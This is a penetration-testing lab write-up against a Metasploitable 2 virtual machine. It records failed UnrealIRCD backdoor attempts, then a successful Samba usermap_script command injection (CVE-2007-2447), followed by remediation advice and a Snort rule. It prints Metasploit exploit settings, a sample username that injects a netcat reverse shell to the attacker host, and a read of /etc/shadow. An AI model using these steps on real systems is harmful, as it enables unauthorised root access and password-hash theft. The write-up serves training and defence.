# Phase 3: Multiple Exploitation Attempts - Adaptability in Penetration Testing

## Executive Summary

This phase demonstrates real-world penetration testing methodology: attempting multiple attack vectors, troubleshooting failures, and successfully pivoting to alternative exploits when initial attempts don't succeed. Successfully exploited Samba username map script command injection vulnerability (CVE-2007-2447) to gain root access after troubleshooting UnrealIRCD backdoor exploitation attempts.

**Key Learning:** Not every exploit works perfectly on first attempt. Professional penetration testing requires adaptability, troubleshooting skills, and the ability to pivot between attack vectors.

---

## Attack Attempt #1: UnrealIRCD Backdoor (Unsuccessful)

### Target Information

**Service:** UnrealIRCD 3.2.8.1  
**Port:** 6667 (IRC - Internet Relay Chat)  
**Vulnerability:** CVE-2010-2075 - Backdoor Command Execution  
**Metasploit Module:** `exploit/unix/irc/unreal_ircd_3281_backdoor`

### Vulnerability Background

**What is UnrealIRCD?**
- IRC (Internet Relay Chat) server software used for real-time messaging
- Popular in the 2000s-2010s for chat rooms and communities

**The Backdoor:**
- In June 2010, UnrealIRCD's source code was compromised
- Malicious backdoor inserted into version 3.2.8.1
- Backdoor triggers when specific IRC commands are sent
- Attacker sends characters `AB` followed by system commands
- Server executes commands with IRC daemon privileges

**Similar to vsftpd backdoor (Phase 2), but different trigger mechanism:**
- vsftpd: Username with `:)` → opens port 6200
- UnrealIRCD: IRC command with `AB` prefix → executes commands directly

---

### Exploitation Attempts

#### Attempt 1: Reverse Shell Payload

**Configuration:**
```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.100.10
set RPORT 6667
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.100.5
set LPORT 4444
exploit
```

**Result:** 
```
[*] Handler failed to bind to 192.168.100.5:4444
[*] Exploit completed, but no session was created.
```

**Issue:** Payload handler could not bind to the specific local IP address.

---

#### Attempt 2: Reverse Shell with Wildcard Listener

**Configuration:**
```
set LHOST 0.0.0.0
exploit
```

**Result:**
```
[*] Started reverse TCP double handler on 0.0.0.0:4444
[*] Exploit completed, but no session was created.
```

**Issue:** Handler started but target connection never established.

---

#### Attempt 3: Bind Shell Payload

**Configuration:**
```
set PAYLOAD cmd/unix/bind_netcat
show options
exploit
```

**Result:**
```
[*] Exploit completed, but no session was created.
```

**Issue:** Bind shell also failed to establish session.

---

#### Attempt 4: Generic Command Payload

**Configuration:**
```
set PAYLOAD cmd/unix/generic
set CMD /bin/sh
exploit
```

**Result:**
```
[*] Exploit completed, but no session was created.
```

**Issue:** Even the generic payload failed to create a working session.

---

### Root Cause Analysis

**Possible Reasons for Failure:**

1. **Service Configuration Issues**
   - UnrealIRCD may not be running with the vulnerable configuration
   - The username map script feature might be disabled
   - Service permissions may restrict command execution

2. **Network Timing**
   - IRC protocol has specific timing requirements
   - Payload delivery timing may be incompatible with target configuration

3. **Payload Compatibility**
   - Target system may lack required binaries (netcat, perl, bash)
   - Shell environment restrictions

4. **Lab Environment Specifics**
   - Metasploitable 2's specific configuration of UnrealIRCD
   - Possible differences from the exploit's expected environment

---

### Decision: Pivot to Alternative Attack Vector

**Professional Penetration Testing Practice:**

In real penetration tests, not every exploit works. When one attack vector fails after reasonable troubleshooting:
1. Document what was attempted
2. Analyze potential causes
3. **Pivot to alternative vulnerabilities**
4. Continue the assessment

**Next target selected:** Samba username map script (different vulnerability type, different service)

---

## Attack #2: Samba Username Map Script - Command Injection (Successful)

### Target Information

**Service:** Samba (SMB/CIFS file sharing)  
**Ports:** 139 (NetBIOS), 445 (Direct SMB)  
**Vulnerability:** CVE-2007-2447 - Command Injection in Username Parameter  
**Metasploit Module:** `exploit/multi/samba/usermap_script`  
**Rank:** Excellent

### Vulnerability Background

**What is Samba?**
- Open-source implementation of SMB/CIFS protocol
- Allows Linux/Unix systems to share files with Windows networks
- Extremely common in enterprise environments
- Often runs with elevated privileges

**CVE-2007-2447 Details:**

**Discovery Date:** May 14, 2007  
**Affected Versions:** Samba 3.0.0 through 3.0.25rc3  
**Vulnerability Type:** Command Injection  
**CVSS Score:** 10.0 (Critical)

**How the Vulnerability Works:**

1. Samba has a feature called "username map script"
2. This feature processes usernames through a script
3. **The vulnerability:** Improper input sanitization of username field
4. Usernames containing shell metacharacters are executed as commands
5. **No authentication required** - can be exploited anonymously

**Attack Mechanism:**

When a malicious username like this is submitted:
```
/=`nohup nc 192.168.100.5 4444 -e /bin/sh`
```

**What happens:**
- The backticks (`) tell the shell to execute the enclosed command
- The command runs with the privileges of the Samba daemon (often root)
- A reverse shell connects back to the attacker

**This is a DIFFERENT vulnerability class than vsftpd:**
- vsftpd (Phase 2): Backdoor - malicious code intentionally inserted
- Samba (Phase 3): Command Injection - input validation failure

---

### Exploitation Methodology

#### Step 1: Module Selection

```bash
search samba usermap
```

**Result:**
```
exploit/multi/samba/usermap_script  2007-05-14  excellent  No  Samba "username map script" Command Execution
```

**Key observations:**
- **Rank: excellent** - Highly reliable exploit
- **Platform: multi** - Works across multiple operating systems
- **No check available** - Cannot verify vulnerability before exploiting

---

#### Step 2: Configuration

```bash
use exploit/multi/samba/usermap_script
show options
```

**Required options:**
```
Name    Current Setting  Required  Description
----    ---------------  --------  -----------
RHOSTS                   yes       The target host(s)
RPORT   139              yes       The target port (TCP)
```

**Configuration commands:**
```bash
set RHOSTS 192.168.100.10
```

**Notable difference from UnrealIRCD:**
- No payload selection required
- No LHOST/LPORT configuration needed
- Built-in payload handles reverse connection automatically
- **Much simpler configuration**

---

#### Step 3: Execution

```bash
exploit
```

**Successful output:**
```
[*] Started reverse TCP handler on 192.168.100.5:4444
[*] Command shell session 1 opened (192.168.100.5:4444 -> 192.168.100.10:49346)
```

**Indicators of success:**
- Reverse TCP handler started
- Connection established from target
- Shell session opened

---

### Post-Exploitation: Proof of Compromise

#### Verify Root Access

```bash
whoami
```
**Output:** `root`

```bash
id
```
**Output:** `uid=0(root) gid=0(root) groups=0(root)`

**Significance:**
- UID 0 = root user (superuser)
- Complete administrative control
- Full system compromise achieved

---

#### System Information Gathering

```bash
hostname
```
**Output:** `metasploitable`

```bash
uname -a
```
**Output:** 
```
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

**Key details:**
- Kernel: 2.6.24 (released 2008)
- Ubuntu Server 8.04
- 32-bit architecture (i686)
- Severely outdated system

---

#### Access Sensitive Files

```bash
head -3 /etc/shadow
```

**Sample output:**
```
root:$1$abcd1234$xyz...:14500:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
```

**Significance:**
- `/etc/shadow` contains encrypted password hashes
- Only readable by root user
- Could be extracted for offline password cracking
- Demonstrates complete system access

---

#### Create Proof of Access

```bash
echo "Attack #2: Samba usermap_script - Command Injection - Jordan pwned this - $(date)" > /tmp/samba_pwned.txt
cat /tmp/samba_pwned.txt
```

**Output:**
```
Attack #2: Samba usermap_script - Command Injection - Jordan pwned this - Mon Feb 10 16:28:50 UTC 2026
```

**Purpose:**
- Standard penetration testing practice
- Timestamp proves compromise occurred
- Evidence for documentation and reporting

---

## Technical Comparison: vsftpd vs Samba

### Attack Flow Comparison

**vsftpd Backdoor (Phase 2):**
```
1. Connect to FTP (port 21)
2. Send username with :) trigger
3. Backdoor opens port 6200
4. Connect to port 6200
5. Root shell obtained
```

**Samba Command Injection (Phase 3):**
```
1. Connect to SMB (port 139/445)
2. Submit username with shell metacharacters
3. Commands execute immediately
4. Reverse shell connects back
5. Root shell obtained
```

---

### Vulnerability Type Comparison

| Aspect | vsftpd Backdoor | Samba Command Injection |
|--------|-----------------|-------------------------|
| **Type** | Malicious Code | Input Validation Failure |
| **Discovery** | 2011 | 2007 |
| **Cause** | Compromised source code | Poor input sanitization |
| **Trigger** | `:)` in username | Shell metacharacters in username |
| **Execution** | Opens backdoor port | Direct command execution |
| **Authentication** | Not required | Not required |
| **CVSS** | 10.0 | 10.0 |
| **Exploit Rank** | Excellent | Excellent |

---

### Key Differences in Exploitation

**vsftpd:**
- Two-stage process (trigger backdoor, then connect)
- Uses separate port (6200)
- Backdoor spawns independently
- Simpler Metasploit configuration

**Samba:**
- Single-stage process (immediate execution)
- Uses original service ports (139/445)
- Commands execute in-process
- Built-in reverse shell payload

---

## Lessons Learned

### 1. Not All Exploits Work First Try

**Reality of Penetration Testing:**
- Lab environments may differ from exploit expectations
- Service configurations vary
- Network conditions affect exploit reliability
- **Troubleshooting is a core pentesting skill**

**Professional Response:**
- Document failed attempts
- Analyze potential causes
- Pivot to alternative attack vectors
- Don't waste excessive time on one approach

---

### 2. Multiple Vulnerability Classes Exist

**Successfully demonstrated:**
- **Backdoor exploitation** (vsftpd - Phase 2)
- **Command injection** (Samba - Phase 3)

**These represent different OWASP Top 10 categories:**
- Backdoors → Supply Chain Attacks
- Command Injection → Injection Flaws

**Why this matters:**
- Shows versatility in exploitation techniques
- Demonstrates understanding of different attack classes
- Valuable for security engineer interviews

---

### 3. Simplicity Often Wins

**UnrealIRCD exploit:**
- Required manual payload selection
- Multiple configuration parameters
- Complex payload delivery mechanism
- **Failed despite multiple attempts**

**Samba exploit:**
- Built-in payload
- Minimal configuration
- Simple execution
- **Succeeded immediately**

**Lesson:** Sometimes the simpler exploit with better reliability is preferable to a complex approach.

---

### 4. Adaptability is Critical

**What professional pentesters do:**
1. Try primary exploit
2. Troubleshoot if it fails
3. **Pivot when troubleshooting isn't productive**
4. Document both successes and failures
5. Continue assessment with alternative methods

**This assessment demonstrated:**
- ✅ Multiple exploitation attempts
- ✅ Systematic troubleshooting
- ✅ Professional pivoting
- ✅ Successful alternative exploitation
- ✅ Honest documentation

---

## Impact Assessment

### In a Real Environment, This Compromise Would Enable:

**Immediate Capabilities:**
- Read/modify/delete any file on the system
- Create/delete user accounts
- Install malware, rootkits, backdoors
- Access all data (databases, files, credentials)
- Modify system configurations
- Disable security controls

**Business Impact:**
- **Confidentiality:** Complete data breach
- **Integrity:** System and data modification without detection
- **Availability:** System can be disabled or destroyed
- **Compliance:** Violation of regulatory requirements
- **Reputation:** Loss of customer trust

**OT/ICS Specific Concerns:**
- File sharing services common in OT environments
- Access could enable manipulation of control systems
- Safety systems could be compromised
- Operational disruptions or physical damage possible

---

## Remediation Recommendations

### Immediate Actions

**1. Verify Samba Version**
```bash
smbd --version
```
- Check all Samba servers for vulnerable versions (3.0.0 - 3.0.25rc3)

**2. Update Samba Immediately**
```bash
sudo apt-get update
sudo apt-get upgrade samba
```
- Ensure version is 3.0.26 or later
- Test in non-production before deploying

**3. Disable Username Map Script (If Not Needed)**
```bash
# In /etc/samba/smb.conf, remove or comment out:
# username map script = /path/to/script
```

**4. Restrict SMB Access**
```bash
# In /etc/samba/smb.conf:
hosts allow = 192.168.1.0/24
hosts deny = all
```

---

### Long-Term Security Improvements

**1. Network Segmentation**
- Place file servers in protected network zones
- Restrict SMB ports (139, 445) at firewall
- Implement Zero Trust network architecture
- Use VPN for remote file access

**2. Monitoring and Detection**

**Network-Based Detection:**
- Monitor for SMB connections from unexpected sources
- Alert on unusual username patterns (special characters)
- Detect reverse shell connections (outbound connections from servers)

**Example Snort/Suricata Rule:**
```
alert tcp any any -> any [139,445] (msg:"Potential Samba Username Injection"; content:"/="; content:"`"; within:20; sid:1000002; rev:1;)
```

**Host-Based Detection:**
- Monitor Samba logs for suspicious authentication attempts
- Alert on command execution from smbd process
- Track privilege escalation events

**3. Principle of Least Privilege**
- Run Samba with non-root user (if possible)
- Use chroot jails for file sharing
- Implement strict file permissions
- Separate file sharing from critical systems

**4. Input Validation**
- Sanitize all user-supplied input
- Reject usernames with special characters
- Implement whitelist of allowed characters
- Use parameterized queries/prepared statements

**5. Regular Security Assessments**
- Schedule quarterly vulnerability scans
- Perform annual penetration tests
- Review and update security configurations
- Audit file sharing permissions

---

## Skills Demonstrated

### Technical Skills:
- ✅ Metasploit Framework proficiency
- ✅ Payload selection and configuration
- ✅ Exploit troubleshooting and debugging
- ✅ Professional pivoting between attack vectors
- ✅ Multiple vulnerability class exploitation
- ✅ Linux command-line expertise
- ✅ Post-exploitation enumeration
- ✅ Root cause analysis

### Professional Skills:
- ✅ Systematic troubleshooting methodology
- ✅ Honest documentation (including failures)
- ✅ Adaptability and resilience
- ✅ Risk assessment and impact analysis
- ✅ Remediation planning
- ✅ Detection strategy development

---

## Comparison to Phase 2

**Phase 2 (vsftpd):**
- Single exploit attempt
- Immediate success
- Backdoor-based vulnerability
- Straightforward exploitation

**Phase 3 (Multiple Exploits):**
- Multiple exploit attempts
- Troubleshooting required
- Pivot to alternative attack
- Command injection vulnerability
- **More realistic pentesting scenario**

**Both phases together demonstrate:**
- Success in straightforward scenarios
- Resilience when facing challenges
- Multiple attack techniques
- Professional methodology

---

## References

**UnrealIRCD Backdoor:**
- **CVE-2010-2075:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075
- **Metasploit Module:** exploit/unix/irc/unreal_ircd_3281_backdoor
- **Advisory:** http://seclists.org/fulldisclosure/2010/Jun/277

**Samba Command Injection:**
- **CVE-2007-2447:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447
- **Metasploit Module:** exploit/multi/samba/usermap_script
- **Samba Security Advisory:** https://www.samba.org/samba/security/CVE-2007-2447.html
- **Rapid7 Analysis:** https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/

---

## Next Steps

**Phase 4: Detection & Defense** (Planned)
- Deploy SIEM (Security Onion or ELK Stack)
- Detect Phase 2 and Phase 3 attacks in real-time
- Write custom detection rules for both attack types
- Implement system hardening controls
- Document blue team response procedures

**Goal:** Demonstrate both offensive and defensive security capabilities - the complete security engineer skillset.

---

*Last Updated: February 10, 2026*  
*Lab Environment: Isolated VMnet - No production systems affected*  
*All activities conducted in authorized training environment*
